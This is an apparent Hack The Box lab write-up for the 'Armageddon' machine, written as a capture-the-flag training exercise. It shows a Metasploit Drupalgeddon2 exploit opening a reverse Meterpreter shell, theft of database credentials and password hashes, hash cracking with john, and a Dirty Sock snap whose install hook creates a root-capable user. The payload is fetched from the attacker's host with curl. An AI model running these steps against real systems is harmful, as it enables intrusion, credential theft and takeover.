---
layout: default
title: Armageddon
parent: Hack The Box
nav_order: 1
has_children: false
permalink: /htb/armageddon
---

# Armageddon Lab Report
Drupal 7.56

## 1. Connect to VPN
``` bash
sudo openvpn vpn.ovpn
```
## 2. Nmap Target
```
nmap -sC -sV 10.10.10.233

22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```

## 3. Search for Exploit
Drupal 7.56 is vulnerable to Drupalgeddon2.
https://www.exploit-db.com/exploits/44449

## 4. Metasploit with Drupalgeddon2
```
search Drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set lhost 10.10.14.27 (My IP)
set rhosts 10.10.10.233
exploit
```
```
[*] Started reverse TCP handler on 10.10.14.27:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.27:4444 -> 10.10.10.233:43272) at 2021-04-02 02:03:21 +0900
```

## 5. Database Credentials
/var/www/html/sites/default/settings.php
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => '<HIDDEN PASSWD>',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

## 6. MySqlDump Drupal Database
```
mysqldump drupal -u drupaluser -p > dump.sql
download  dump.sql
```

## 7. Enable Mysql service and search for credentials
bash
```
systemctl start mysql
sudo mysql
```

mysql
```
CREATE drupal;
exit
```
bash
```
sudo mysql drupal < dump.sql
```

mysql
``` 
USE drupal;
SELECT * FROM users;
```
```
+-----+-------------------+---------------------------------------------------------+---------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+---------------------+--------------------------+
| uid | name              | pass                                                    | mail                | theme | signature | signature_format | created    | access     | login      | status | timezone      | language | picture | init                | data                     |
+-----+-------------------+---------------------------------------------------------+---------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+---------------------+--------------------------+
|   0 |                   |                                                         |                     |       |           | NULL             |          0 |          0 |          0 |      0 | NULL          |          |       0 |                     | NULL                     |
|   1 | brucetherealadmin | $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt | admin@armageddon.eu |       |           | filtered_html    | 1606998756 | 1607077194 | 1607076276 |      1 | Europe/London |          |       0 | admin@armageddon.eu | a:1:{s:7:"overlay";i:1;} |
|   3 | max               | $S$D8m3/3dYQyGaQY4IgFxM1ROuYsfNkGGMP.7QWdfskCUKOwBAHHeU | max@gmail.com       |       |           | filtered_html    | 1617727795 |          0 |          0 |      0 | Europe/London |          |       0 | max@gmail.com       | NULL                     |
+-----+-------------------+---------------------------------------------------------+---------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+---------------------+--------------------------+
```

## 8. Decode Hash and get User
```
touch passwd
vi passwd 
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Save & Exit

john passwd --show
?:<HIDDEN PASSWD>

1 password hash cracked, 0 left
```

## 9. Connect SSH and get User Hash
```
ssh 10.10.10.233 -l brucetherealadmin
Password: <HIDDEN PASSWD>

cd /home/brucetherealadmin
cat user.txt
9d1decefb906cf655c7b897247474a8f
```

## 10. Check for sudoable commands
``` 
sudo -l

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

## 11. Exploit Snap with Dirty Sock
https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
※ Kali Linux cannot craft Snaps properly, used Ubuntu 20.04.2.0 LTS (Focal Fossa) instead
```
## Install necessary tools
sudo apt install snapcraft -y

## Make an empty directory to work with
cd /tmp
mkdir dirty_snap
cd dirty_snap

## Initialize the directory as a snap project
snapcraft init

## Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install

## Write the script we want to execute as root
cat > snap/hooks/install << "EOF"
#!/bin/bash

useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF

## Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: dirty-sock
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF

## Build the snap
snapcraft
```

## 12. Copy Crafted Snap to Target
Curl through python simple server

Host
```
sudo python -m http.server 80
```
Target
```
curl 10.10.14.40/dirty_sock.snap > exploit.snap (Crafted Snap)
sudo /usr/bin/snap install /home/brucetherealadmin/exploit.snap --devmode
dirty-sock 0.1 installed
```

## 13. SU dirty_sock
```
su dirty_sock
Password: dirty_sock

cat /root/root.txt
rooted!
```